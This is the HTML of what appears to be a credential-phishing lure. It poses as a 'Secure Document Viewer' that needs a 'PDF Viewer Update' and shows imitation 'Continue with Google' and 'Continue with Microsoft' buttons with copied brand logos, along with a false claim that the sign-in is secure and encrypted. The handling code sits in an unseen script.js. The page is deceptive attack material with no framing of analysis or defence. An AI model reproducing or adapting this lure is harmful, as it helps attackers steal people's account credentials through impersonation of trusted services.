<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Document Viewer</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="bg"></div>

<div class="overlay">
  <div class="card">

    <div class="icon">📄</div>

    <h2>PDF Viewer Update Required</h2>

    <p>
      Your current PDF extension is outdated or unsupported.<br>
      Please sign in to securely view this document.
    </p>

    <!-- GOOGLE BUTTON -->
    <button class="btn" id="googleLogin">
      <svg class="icon-img" viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.36 1.53 7.82 2.81l5.76-5.76C33.64 3.04 29.23 1 24 1 14.64 1 6.56 6.94 2.92 14.44l6.9 5.36C11.63 13.08 17.27 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.1 24.5c0-1.64-.15-3.21-.43-4.73H24v9h12.44c-.54 2.9-2.16 5.36-4.6 7.02l7.16 5.56C43.98 36.92 46.1 31.14 46.1 24.5z"/>
        <path fill="#FBBC05" d="M10.82 28.8c-.48-1.44-.75-2.96-.75-4.55s.27-3.11.75-4.55l-6.9-5.36C2.7 17.41 2 20.62 2 24.25s.7 6.84 1.92 9.91l6.9-5.36z"/>
        <path fill="#34A853" d="M24 47c6.48 0 11.92-2.14 15.89-5.82l-7.16-5.56c-2 1.34-4.56 2.13-8.73 2.13-6.73 0-12.37-3.58-14.18-8.7l-6.9 5.36C6.56 41.06 14.64 47 24 47z"/>
      </svg>
      Continue with Google
    </button>

    <!-- MICROSOFT BUTTON -->
    <button class="btn" id="microsoftLogin">
      <svg class="icon-img" viewBox="0 0 24 24">
        <rect width="10" height="10" x="0" y="0" fill="#F25022"/>
        <rect width="10" height="10" x="12" y="0" fill="#7FBA00"/>
        <rect width="10" height="10" x="0" y="12" fill="#00A4EF"/>
        <rect width="10" height="10" x="12" y="12" fill="#FFB900"/>
      </svg>
      Continue with Microsoft
    </button>

    <small>🔒 Your sign-in is secure and encrypted</small>

  </div>
</div>

<script src="script.js"></script>
</body>
</html>
